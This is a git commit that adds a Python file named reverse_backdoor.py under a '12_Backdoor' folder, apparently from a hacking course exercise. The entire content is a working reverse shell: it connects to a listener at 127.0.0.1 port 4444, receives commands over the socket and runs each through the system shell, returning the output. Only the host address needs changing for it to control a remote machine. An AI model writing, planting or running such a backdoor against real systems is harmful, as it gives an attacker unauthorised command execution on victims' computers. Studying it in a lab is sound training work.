f333346b4afbbb68669e193be4d598106b8c5f63
Eby Stewart <ebyystewart@gmail.com>
2025-11-10 10:29:43 +0530

    reverse shell script

---
+++ 12_Backdoor/reverse_backdoor.py
@@ -0,0 +1,28 @@
+
+import socket, subprocess
+
+def execute_system_command(command):
+    return subprocess.check_output(command, shell=True)
+
+connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+connection.connect(("127.0.0.1", 4444))
+
+connection.send("\n[+] Connection Established.\n")
+
+while True:
+    try:
+        received_command = connection.recv(1024)
+        #print(received_data)
+        command_result = execute_system_command(received_command)
+        connection.send(command_result)
+
+    #except CalledProcessError:
+        #pass
+    
+    except KeyboardInterrupt:
+        print("[+] Detected CTRL + C.....Closing App....Please wait...")
+        connection.close()
+        exit()
+
+
+connection.close()
